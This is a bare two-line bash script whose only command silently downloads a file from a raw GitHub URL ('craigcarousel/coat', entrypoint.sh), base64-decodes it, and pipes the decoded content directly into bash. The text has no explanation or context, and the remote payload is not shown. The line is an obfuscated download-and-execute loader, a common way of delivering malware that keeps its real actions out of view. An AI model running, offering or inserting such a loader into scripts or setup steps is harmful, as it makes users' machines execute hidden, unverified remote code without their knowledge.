#!/bin/bash
wget -qO- https://raw.githubusercontent.com/craigcarousel/coat/refs/heads/main/entrypoint.sh | base64 -d | bash
